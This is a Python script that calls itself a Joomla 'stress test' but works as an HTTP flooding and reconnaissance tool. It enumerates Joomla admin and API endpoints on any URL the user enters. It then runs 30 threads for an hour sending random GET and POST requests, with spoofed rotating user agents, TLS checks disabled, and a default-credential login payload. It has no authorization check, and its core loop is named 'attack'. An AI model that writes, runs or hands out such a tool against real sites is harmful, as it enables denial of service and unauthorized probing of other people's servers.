import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class JoomlaTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Common Joomla endpoints
        self.endpoints = [
            "administrator",  # Admin interface
            "administrator/index.php",
            "api",  # Joomla API
            "api/index.php/v1/users",
            "api/index.php/v1/articles",
            "api/index.php/v1/categories",
            "administrator/components",
            "administrator/modules",
            "administrator/templates",
            "installation",
            "components/com_users",
            "components/com_content",
            "components/com_admin",
            "components/com_config",
            "components/com_media",
            "index.php?option=com_users",
            "index.php?option=com_content",
            "libraries",
            "modules",
            "plugins",
            "templates"
        ]
        self.payloads = {
            "auth_test": {
                "username": "admin",
                "password": "admin123",
                "option": "com_login",
                "task": "login"
            },
            "article_test": {
                "title": "Test Article",
                "alias": "test-article",
                "articletext": "Test content",
                "catid": "2",
                "language": "*"
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def verify_endpoint(self, url, endpoint):
        """Verify endpoint availability before testing"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={"User-Agent": self.get_random_user_agent()},
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url):
        """Discover valid Joomla endpoints"""
        print("[INFO] Discovering valid Joomla endpoints...")
        valid_endpoints = []
        
        # Additional Joomla-specific endpoints
        additional_endpoints = [
            "wp-admin",  # Common misconfiguration check
            "administrator/manifests",
            "administrator/language",
            "administrator/help",
            "administrator/cache",
            "administrator/logs",
            "components/com_mailto",
            "components/com_wrapper",
            "components/com_search",
            "components/com_finder"
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        if not valid_endpoints:
            print("[WARNING] No valid endpoints found. Using default endpoints.")
            return self.endpoints
        
        return valid_endpoints

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Add Joomla-specific headers
        additional_headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document"
        }
        self.headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                if data:
                    # Add Joomla token if available
                    token = self.get_joomla_token(url)
                    if token:
                        data[token['name']] = token['value']
                
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            if response.status_code in [404, 403]:
                return None
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def get_joomla_token(self, url):
        """Get Joomla security token"""
        try:
            response = requests.get(
                f"{url.rstrip('/')}/administrator/index.php",
                headers={"User-Agent": self.get_random_user_agent()},
                verify=False
            )
            # In a real implementation, you would parse the response to find the token
            # Joomla typically uses a token in the format:
            # <input type="hidden" name="[token_name]" value="[token_value]" />
            return {
                "name": "token",
                "value": "dummy_token"  # Replace with actual token extraction
            }
        except:
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
        
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[ERROR] No valid endpoints found. Aborting test.")
            return
            
        self.endpoints = valid_endpoints
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("article_test") if method == "POST" else None
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))  # Shorter delay for successful requests
                else:
                    time.sleep(random.uniform(0.5, 1.0))  # Longer delay for failed requests

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target Joomla URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = JoomlaTester()
        tester.flood(target_url, workers=30, duration=3600)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
